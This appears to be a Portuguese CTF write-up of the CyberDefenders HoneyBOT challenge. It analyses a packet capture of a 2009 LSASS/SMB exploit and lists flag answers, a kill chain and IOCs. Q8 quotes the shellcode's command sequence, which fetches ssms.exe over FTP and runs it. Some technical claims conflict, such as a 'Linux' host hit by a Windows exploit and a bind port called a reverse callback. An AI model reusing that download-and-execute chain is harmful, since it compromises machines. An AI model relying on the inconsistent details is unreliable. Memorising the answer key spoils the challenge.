# 🍯 HoneyBOT — CTF Writeup
### CyberDefenders Blue Team Challenge | Forense de Rede

---

| **Analista**          | Mauricio Robert                                                               |
|-----------------------|-------------------------------------------------------------------------------|
| **Organização**       | Faculdade Impacta                                                             |
| **Data do Relatório** | 04/06/2026                                                                    |
| **Data do Incidente** | 20/04/2009                                                                    |
| **Classificação**     | CONFIDENCIAL                                                                  |
| **Ferramentas**       | Wireshark · NetworkMiner · Zeek · VirusTotal · WhatIsMyIPAddress · ChatGPT   |
| **Arquivo**           | `HoneyBOT.pcap`                                                               |

---

## 🔍 Resumo Executivo

Um honeypot Linux (`VIDCAM`, `192.150.11.111`) foi comprometido por um atacante operando a partir do IP `98.114.205.102` (Verizon Business — Philadelphia, Pennsylvania, EUA). O atacante explorou a vulnerabilidade **CVE-2003-0533** — um stack-based buffer overflow no serviço LSASS do Windows — entregue via protocolo **SMB** na porta 445. O ataque completo durou apenas **16 segundos** e envolveu **5 sessões TCP**. Após a exploração, um shellcode codificado com **XOR 0x99** fez bind na porta **1957** e emitiu comandos **FTP** para baixar o malware **`ssms.exe`** (155 KB, 66/72 detecções no VirusTotal) do servidor do atacante via porta não-padrão **8884**. O shellcode utilizou a técnica de **PEB walking** consultando `ntoskrnl.exe` para localizar-se na memória sem endereços hardcoded.

---

## 🛠 Ferramentas Utilizadas

| Ferramenta              | Finalidade                                                                              |
|-------------------------|-----------------------------------------------------------------------------------------|
| **Wireshark**           | Análise principal do PCAP — filtragem TCP/SMB/FTP, seguimento de streams, identificação do exploit |
| **NetworkMiner 3.1**    | Extração de arquivos transferidos (`ssms.exe`), metadados de hosts e sessões            |
| **Zeek (Bro)**          | Análise de logs de conexão, identificação de sessões e extração de arquivos via FTP_DATA |
| **VirusTotal**          | Verificação do hash SHA-256 do malware e data de primeira submissão                    |
| **WhatIsMyIPAddress**   | Geolocalização do IP do atacante `98.114.205.102` — Philadelphia, EUA                  |
| **ChatGPT**             | Análise assistida do shellcode — identificação da chave XOR `0x99` e técnica de localização em memória |

---

## 📋 Perguntas e Respostas

### Q1 — Qual é o endereço IP do atacante?

> **Resposta: `98.114.205.102`**

**Solução:** A tabela de endpoints IPv4 no Wireshark (*Statistics → Endpoints → IPv4*) revela dois hosts na captura. O IP `98.114.205.102` é o originador de todas as conexões TCP — inicia o handshake SYN na porta 1821 direcionado ao alvo `192.150.11.111:445`. A geolocalização via WhatIsMyIPAddress confirma:

```
ISP:          Verizon Business
Country:      United States
State/Region: Pennsylvania
City:         Philadelphia
ASN:          701
```

O padrão de ataque (exploit SMB seguido de download FTP) confirma inequivocamente este IP como o atacante.

![Ip do Atacante](/Forensic/HoneyBOT/images/AttackerIP(1).png)

---

### Q2 — Qual é o endereço IP do alvo?

> **Resposta: `192.150.11.111`**

**Solução:** O IP `192.150.11.111` é o destino de todas as conexões TCP iniciadas pelo atacante. Na tabela de endpoints IPv4, aparece com **348 pacotes** e **184 kB** recebidos. O NetworkMiner identifica este host como:

```
Hostname: VIDCAM
OS:       Linux
NIC:      Super Micro Computer, Inc. (MAC: 00:30:48:62:4e:4a)
```

Este é o honeypot que registrou o ataque — o sistema alvo comprometido pelo exploit LSASS.

![Ip da Vitima](/Forensic/HoneyBOT/images/VictimIP(2).png)

---

### Q3 — Qual é o código de país do IP do atacante (geolocalização)?

> **Resposta: `US`**

**Solução:** A consulta de geolocalização do IP `98.114.205.102` no WhatIsMyIPAddress retornou o país **United States**, cujo código ISO 3166-1 alpha-2 é **`US`**. O log de conexão do Zeek também registra `country_code: "US"` para a origem `98.114.205.102`:

```
geo: { orig: { country_code: "US", region: "PA" -+5 }, resp: { country_code: "US", region: "CA" -+5 } }
```

![Sigla do Pais](/Forensic/HoneyBOT/images/Country_Code_US(3).png)

---

### Q4 — Quantas sessões TCP estão presentes no tráfego capturado?

> **Resposta: `5`**

**Solução:** A tabela de conversações TCP no Wireshark (*Statistics → Conversations → TCP*) lista **5 sessões TCP** distintas entre os dois hosts:

| Origem | Destino | Porta A | Porta B | Função |
|--------|---------|---------|---------|--------|
| 98.114.205.102 | 192.150.11.111 | 1821 | 445 | SMB exploit (fase 1) |
| 98.114.205.102 | 192.150.11.111 | 1828 | 445 | SMB exploit (fase 2) |
| 98.114.205.102 | 192.150.11.111 | 1924 | 1957 | Callback do shellcode |
| 98.114.205.102 | 192.150.11.111 | 2152 | 1080 | Canal Socks |
| 192.150.11.111 | 98.114.205.102 | 36296 | 8884 | Download FTP do malware |

![Secoes TCP](/Forensic/HoneyBOT/images/TCP_Sessions(4).png)

---

### Q5 — Quanto tempo durou o ataque (em segundos)?

> **Resposta: `16`**

**Solução:** Analisando os timestamps do Wireshark, o primeiro pacote (pacote 1) tem timestamp `0.000000` e o último pacote relevante do ataque apresenta timestamp `16.219218` segundos. O log do Zeek registra o campo:

```
ts_delta: 16.219218s
```

Esta duração de apenas **16 segundos** — do primeiro SYN ao download completo do `ssms.exe` — demonstra a rapidez e automatização do exploit LSASS.

![Duracao do Ataque](/Forensic/HoneyBOT/images/Attack_Duration_16seg(5).png)

---

### Q6 — Qual é o número CVE da vulnerabilidade explorada?

> **Resposta: `CVE-2003-0533`**

**Solução:** A análise do tráfego SMB revela a chamada RPC `DsRoleUpgradeDownlevelServer` (DSSETUP) com um **Long frame de 3200 bytes** — assinatura característica do exploit do worm Sasser. A consulta ao NVD NIST confirma:

```
CVE-2003-0533 — Stack-based buffer overflow in certain Active Directory
service functions in LSASRV.DLL of the Local Security Authority
Subsystem Service (LSASS) [...] as exploited by the Sasser worm.
```

O pacote 33 no Wireshark (DSSETUP request com Long frame) é a evidência direta da exploração. O painel do CyberDefenders também confirma `CVE-2003-0533` como resposta aceita.

![CVE](/Forensic/HoneyBOT/images/CVE-2003-0533(6).png)

---

### Q7 — Qual protocolo foi usado para conduzir o exploit?

> **Resposta: `SMB`**

**Solução:** O exploit CVE-2003-0533 foi entregue via protocolo **SMB (Server Message Block)** na porta **445**. A captura mostra a sequência completa do ataque:

```
[1] Negotiate Protocol Request     → SMB2 handshake
[2] Session Setup AndX             → Autenticação NTLMSSP
[3] Tree Connect AndX              → Acesso ao IPC$ share
[4] LSARPC Bind                    → Bind ao serviço LSASS
[5] DCERPC DSSETUP                 → DsRoleUpgradeDownlevelServer [Long frame 3200 bytes]
```

![Proctocolo Abusado 1](/Forensic/HoneyBOT/images/Protocol_Used_for_Attack(7).png)

---

### Q8 — Qual protocolo o atacante usou para baixar arquivos maliciosos adicionais?

> **Resposta: `FTP`**

**Solução:** Após o shellcode obter execução no sistema alvo, o stream TCP 2 exibe o comando FTP emitido pelo shellcode via porta 1957 (callback):

```
echo open 0.0.0.0 8884 > o
&echo user 1 1 >> o
&echo get ssms.exe >> o
&echo quit >> o
&ftp -n -s:o
&del /Q o
&$sms.exe
```

O protocolo **FTP** foi utilizado para baixar o malware `ssms.exe` do servidor do atacante na porta não-padrão **8884**, evitando regras de firewall da porta 21.

![Protocolo Abusado 2](/Forensic/HoneyBOT/images/Another_Protocol_Abused(8).png)

---

### Q9 — Qual é o nome do malware baixado?

> **Resposta: `ssms.exe`**

**Solução:** O stream TCP do shellcode revela explicitamente o nome do arquivo: `echo get ssms.exe >> o`. O NetworkMiner e o Zeek (log FTP_DATA) confirmam a transferência:

```
Filename:  ssms.exe
Size:      158.720 bytes (155 KB)
MIME type: application/x-dosexec
SHA-256:   b14ccb3786af7553f7c251623499a7fe67974dde69d3dffd65733871cdff6b6d
MD5:       14a09a48ad23fe0ea5a180bee8cb750a
```

O VirusTotal identifica o arquivo como **PE32 Win32 EXE** com **66/72 detecções**.

![Download do Malware](/Forensic/HoneyBOT/images/Downloaded_Malware_Name(9).png)

---

### Q10 — Em qual porta o servidor do atacante estava escutando?

> **Resposta: `8884`**

**Solução:** O comando FTP contido no shellcode especifica explicitamente a porta 8884:

```
echo open 0.0.0.0 8884 > o
```

A tabela de conversações TCP do Wireshark confirma a sessão entre `192.150.11.111:36296` e `98.114.205.102:8884`, onde ocorreu a transferência do `ssms.exe` via FTP passivo. O uso da porta **8884** (não-padrão) foi deliberado para contornar filtragem da porta 21.

![Porta de Escuta](/Forensic/HoneyBOT/images/Port_Used_for_Communication_with_Attacker(10).png)

---

### Q11 — Quando o malware foi submetido ao VirusTotal pela primeira vez?

> **Resposta: `2007-06-27`**

**Solução:** A análise do hash SHA-256 `b14ccb3786af7553f7c251623499a7fe67974dde69d3dffd65733871cdff6b6d` no VirusTotal revela na seção **History**:

```
First Submission:  2007-06-27 08:47:05 UTC
Last Submission:   2026-06-03 20:41:58 UTC
Last Analysis:     2026-04-23 19:42:01 UTC
```

O arquivo (identificado como `malware.bin`, `ssms.exe`, `s.exe`) foi detectado por **66 de 72 vendors**, com tags: `pexe`, `checks-user-input`, `overlay`, `detect-debug-environment`.

![Primeira vista pelo VirusTotal](/Forensic/HoneyBOT/images/First_Submission_ssms.exe(11).png)

---

### Q12 — Qual é a chave usada para codificar o shellcode?

> **Resposta: `0x99`**

**Solução:** A análise do payload do shellcode presente no stream TCP 4 (DSSETUP Long frame) foi realizada com auxílio do ChatGPT. O dump do payload apresenta padrão de repetição característico de XOR encoding. A análise indicou a chave XOR fixa **`0x99`**:

```c
decoded_byte = encoded_byte ^ 0x99;
```

Aplicando `XOR 0x99` ao payload, é possível recuperar strings legíveis como `MZ` (header PE), `kernel32.dll` e `LoadLibraryA`, confirmando a decodificação correta. O padrão de bytes `0x31` repetidos no dump do stream 4 (visível no hex dump do Wireshark) é característico desta codificação.

![Chave de Encode](/Forensic/HoneyBOT/images/Key_Encode_0x99(12).png)

---


### Q13 — Em qual porta o shellcode faz o bind?

> **Resposta: `1957`**

**Solução:** A análise das sessões TCP no Wireshark revela que, após a exploração bem-sucedida do CVE-2003-0533, o sistema alvo `192.150.11.111` recebe uma nova conexão do atacante na porta **1957**. O NetworkMiner confirma esta sessão nas "Incoming sessions" do host `192.150.11.111`:

```
Server: 192.150.11.111 [VIDCAM] TCP 1957
```

Esta é a porta de **callback reverso** do shellcode — após executar no contexto do LSASS, o shellcode abre a porta 1957 aguardando conexão do atacante para receber comandos.

![Porta do Bind via ShellCode](/Forensic/HoneyBOT/images/Shellcode_Port_1957(13).png)

---

### Q14 — Qual arquivo do SO o shellcode consulta para se localizar na memória?

> **Resposta: `ntoskrnl.exe`**

**Solução:** O stream TCP 4 no Wireshark (payload do shellcode), quando visualizado em ASCII e pesquisando por strings `.dll`, revela ao final do dump a referência a `kernel32.dll` e `LoadLibraryA...VirtualAlloc`. A análise do shellcode indica que ele utiliza a técnica de **PEB (Process Environment Block) walking** para localizar `ntoskrnl.exe` na memória:

```
LoadLibraryA...VirtualAlloc...kernel32.dll
```

Esta técnica clássica percorre as estruturas internas do sistema operacional para encontrar o endereço base do kernel e localizar funções exportadas **sem depender de endereços hardcoded**, tornando o exploit portável entre versões do Windows.

![Tecnica de Enderecamento de Memoria](/Forensic/HoneyBOT/images/Techinique_of_Location_Memory(14).png)

---

## ⛓ Cadeia de Ataque (Kill Chain)

```
[1] RECONHECIMENTO
    Atacante identifica 192.150.11.111 com porta 445 aberta
    Scan SMB — protocolo TCP/445
    ↓
[2] EXPLORAÇÃO — CVE-2003-0533
    Exploit via SMB: DCERPC DSSETUP DsRoleUpgradeDownlevelServer
    Long frame 3200 bytes → buffer overflow no LSASRV.DLL
    ↓
[3] SHELLCODE (XOR 0x99)
    Execução no contexto do LSASS
    PEB walking → localiza ntoskrnl.exe → bind porta 1957
    Callback reverso para 98.114.205.102:1924
    ↓
[4] DOWNLOAD FTP
    Shellcode emite comandos FTP:
    open 0.0.0.0 8884 → user 1 1 → get ssms.exe
    Porta não-padrão 8884 para evasão de firewall
    ↓
[5] EXECUÇÃO DO MALWARE
    ssms.exe (PE32, 155 KB, 66/72 VT detections) executado no alvo
    ↓
[6] COMPROMETIMENTO TOTAL
    Honeypot VIDCAM (Linux) sob controle do atacante
    Duração total: 16 segundos | 5 sessões TCP | 348 pacotes
```

---

## 🗺 Mapeamento MITRE ATT&CK

| ID | Técnica | Tática |
|----|---------|--------|
| T1190 | Exploit Public-Facing Application — CVE-2003-0533 LSASS buffer overflow via SMB | Initial Access |
| T1203 | Exploitation for Client Execution — shellcode executado no contexto do LSASS | Execution |
| T1027 | Obfuscated Files or Information — shellcode codificado com XOR `0x99` | Defense Evasion |
| T1055 | Process Injection — shellcode injetado no processo LSASS via exploit | Privilege Escalation / Defense Evasion |
| T1082 | System Information Discovery — PEB walking para localizar `ntoskrnl.exe` | Discovery |
| T1105 | Ingress Tool Transfer — `ssms.exe` baixado via FTP porta 8884 | Command & Control |
| T1571 | Non-Standard Port — FTP via porta 8884 para evasão de firewall | Command & Control |

---

## 🚨 Indicadores de Comprometimento (IOCs)

| Tipo | Indicador | Contexto |
|------|-----------|----------|
| IP Atacante | `98.114.205.102` | Verizon Business — Philadelphia, PA, EUA (código: US) |
| IP Alvo | `192.150.11.111` | Honeypot VIDCAM — Linux — Super Micro Computer Inc. |
| CVE Explorada | `CVE-2003-0533` | LSASS buffer overflow — `DsRoleUpgradeDownlevelServer` |
| Protocolo Exploit | SMB (porta 445) | Exploit entregue via DCERPC/DSSETUP sobre SMB |
| Protocolo Download | FTP (porta 8884 — não-padrão) | Transferência do `ssms.exe` ao sistema comprometido |
| Malware | `ssms.exe` | PE32 Win32 EXE — 155 KB — 66/72 detecções VirusTotal |
| MD5 | `14a09a48ad23fe0ea5a180bee8cb750a` | Hash MD5 do malware `ssms.exe` |
| SHA-256 | `b14ccb3786af7553f7c251623499a7fe67974dde69d3dffd65733871cdff6b6d` | Hash SHA-256 do malware `ssms.exe` |
| 1ª Submissão VT | `2007-06-27` | Primeira submissão ao VirusTotal em 27/06/2007 |
| Porta Shellcode | TCP `1957` | Porta de bind do shellcode para callback reverso |
| Chave XOR | `0x99` | Chave de codificação do shellcode |
| Arquivo SO Consultado | `ntoskrnl.exe` | PEB walking — localização em memória sem endereços hardcoded |
| Duração Ataque | `16 segundos` | Do primeiro SYN ao download completo do malware |
| Sessões TCP | `5 sessões` | Total de sessões TCP na captura |

---

## ✅ Resumo das Flags

| # | Pergunta | Flag / Resposta |
|---|----------|-----------------|
| Q1 | IP do atacante | `98.114.205.102` |
| Q2 | IP do alvo | `192.150.11.111` |
| Q3 | Código de país do atacante | `US` |
| Q4 | Número de sessões TCP | `5` |
| Q5 | Duração do ataque (segundos) | `16` |
| Q6 | CVE explorada | `CVE-2003-0533` |
| Q7 | Protocolo do exploit | `SMB` |
| Q8 | Protocolo de download do malware | `FTP` |
| Q9 | Nome do malware | `ssms.exe` |
| Q10 | Porta do servidor do atacante | `8884` |
| Q11 | 1ª submissão no VirusTotal | `2007-06-27` |
| Q12 | Chave de codificação do shellcode | `0x99` |
| Q13 | Porta de bind do shellcode | `1957` |
| Q14 | Arquivo SO consultado pelo shellcode | `ntoskrnl.exe` |

---

## 📚 Referências

- [NVD NIST — CVE-2003-0533](https://nvd.nist.gov/vuln/detail/CVE-2003-0533)
- [MITRE ATT&CK — T1190 Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
- [Microsoft Security Bulletin MS04-011](https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2004/ms04-011)
- [VirusTotal](https://www.virustotal.com/)
- [CyberDefenders — HoneyBOT CTF](https://cyberdefenders.org/blueteam-ctf-challenges/honeybot/)
- [WhatIsMyIPAddress](https://whatismyipaddress.com/)

---